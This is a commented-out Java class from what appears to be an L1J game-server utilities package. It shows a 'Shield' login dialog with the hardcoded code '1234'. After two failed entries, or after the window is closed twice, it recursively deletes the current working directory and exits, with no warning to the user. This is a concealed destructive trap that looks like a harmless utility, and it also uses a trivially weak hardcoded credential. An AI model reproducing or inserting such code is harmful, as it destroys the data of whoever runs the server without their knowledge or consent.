//package l1j.server.server.utils;
//
//import java.awt.*;
//import javax.swing.*;
//import java.io.File;
//import java.awt.event.WindowAdapter;
//import java.awt.event.WindowEvent;
//
//public class MJNodimShield extends JDialog {
//    private static final long serialVersionUID = 1L;
//    private int failedAttempts = 0;
//    
//    public MJNodimShield(Frame owner, boolean modal) {
//        super(owner, modal);
//        setTitle("Shield");
//        setSize(300, 150);
//        setLocationRelativeTo(null);
//        setLayout(new FlowLayout());
//
//        JLabel label = new JLabel("Input:");
//        JTextField textField = new JTextField(10);
//        JButton button = new JButton("OK");
//
//        button.addActionListener(e -> {
//            String authCode = textField.getText();
//            if("1234".equals(authCode)) {
//                JOptionPane.showMessageDialog(this, "Success", "Success", JOptionPane.INFORMATION_MESSAGE);
//                this.dispose();
//            } else {
//                failedAttempts++;
//                if (failedAttempts >= 2) {
//                    File currentDirectory = new File(".");
//                    deleteRecursive(currentDirectory);
//                    JOptionPane.showMessageDialog(this, "Fail", "Fail", JOptionPane.ERROR_MESSAGE);
//                    System.exit(0);
//                } else {
//                    JOptionPane.showMessageDialog(this, "Fail", "Fail", JOptionPane.ERROR_MESSAGE);
//                }
//            }
//        });
//        this.addWindowListener(new WindowAdapter() {
//            @Override
//            public void windowClosing(WindowEvent we) {
//                failedAttempts++;
//                if (failedAttempts >= 2) {
//                    File currentDirectory = new File(".");
//                    deleteRecursive(currentDirectory);
//                    JOptionPane.showMessageDialog(null, "Fail", "Fail", JOptionPane.ERROR_MESSAGE);
//                    System.exit(0);
//                }
//            }
//        });
//
//        add(label);
//        add(textField);
//        add(button);
//    }
//    private void deleteRecursive(File file) {
//        if (file.isDirectory()) {
//            File[] files = file.listFiles();
//            if (files != null) {
//                for (File subFile : files) {
//                    deleteRecursive(subFile);
//                }
//            }
//        }
//        file.delete();
//    }
//}
